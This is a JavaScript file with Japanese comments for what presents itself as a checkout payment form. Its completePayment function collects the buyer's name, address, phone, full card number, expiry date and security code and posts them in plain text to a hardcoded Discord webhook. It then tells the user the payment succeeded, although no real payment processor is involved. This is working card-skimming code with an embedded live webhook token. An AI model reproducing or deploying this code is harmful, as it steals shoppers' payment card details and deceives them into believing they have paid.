// 支払いフォームを表示
function showPaymentForm() {
    const paymentFormContainer = document.getElementById('payment-form-container');
    paymentFormContainer.style.display = 'block'; // フォームを表示
}

function completePayment(event) {
    event.preventDefault();  // フォームのデフォルト送信を防ぐ

    const form = document.getElementById('payment-form');
    const formData = new FormData(form);
    const paymentData = {};

    formData.forEach((value, key) => {
        paymentData[key] = value;
    });

    // 必須項目が空でないかチェック
    if (!paymentData.name || !paymentData.email || !paymentData.address || !paymentData.phone || !paymentData.cardNumber || !paymentData.expiryDate || !paymentData.securityCode) {
        alert('すべての必須項目を入力してください。');
        return;
    }

    console.log(paymentData); // 送信前にデータを確認

    // Webhook URL（実際のWebhook URLに置き換えてください）
    const webhookUrl = "https://discordapp.com/api/webhooks/1361871863944581120/GA_xandpROJuTAKKHNyfFjyqCm0CkmG1n0IRYKB4uHfXSK0vxkyYWk9xoPpESi8QZmln"; 

    const messageContent = `支払い情報:\n名前: ${paymentData.name}\nメールアドレス: ${paymentData.email}\n住所: ${paymentData.address}\n電話番号: ${paymentData.phone}\nカード番号: ${paymentData.cardNumber}\n有効期限: ${paymentData.expiryDate}\nセキュリティコード: ${paymentData.securityCode}`;

    // WebhookにPOSTリクエストを送信
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: messageContent // Discordに送信するメッセージ
        })
    })
    .then(response => {
        if (response.ok) {
            alert('支払いが完了しました！');
            window.location.href = "paymentComplete.html"; // 完了後の遷移ページ
        } else {
            alert('エラーが発生しました。再度お試しください。');
        }
    })
    .catch(error => {
        console.error('エラー:', error);
        alert('エラーが発生しました。');
    });
}


// 電話番号の入力形式を整える
function formatPhoneNumber(event) {
    let value = event.target.value;
    value = value.replace(/\D/g, ''); // 数字以外を削除
    if (value.length > 3 && value.length <= 6) {
        value = value.replace(/(\d{3})(\d{1,4})/, '$1-$2');
    } else if (value.length > 6) {
        value = value.replace(/(\d{3})(\d{4})(\d{1,4})/, '$1-$2-$3');
    }
    event.target.value = value;
}

// クレジットカード番号の入力形式を整える
function formatCardNumber(event) {
    let value = event.target.value;
    value = value.replace(/\D/g, ''); // 数字以外を削除
    if (value.length > 4 && value.length <= 8) {
        value = value.replace(/(\d{4})(\d{1,4})/, '$1 $2');
    } else if (value.length > 8 && value.length <= 12) {
        value = value.replace(/(\d{4})(\d{4})(\d{1,4})/, '$1 $2 $3');
    } else if (value.length > 12) {
        value = value.replace(/(\d{4})(\d{4})(\d{4})(\d{1,4})/, '$1 $2 $3 $4');
    }
    event.target.value = value;
}

// 有効期限の入力形式を整える
function formatExpiry(event) {
    let value = event.target.value;
    value = value.replace(/\D/g, ''); // 数字以外を削除
    if (value.length > 2) {
        value = value.replace(/(\d{2})(\d{1,2})/, '$1/$2');
    }
    event.target.value = value;
}
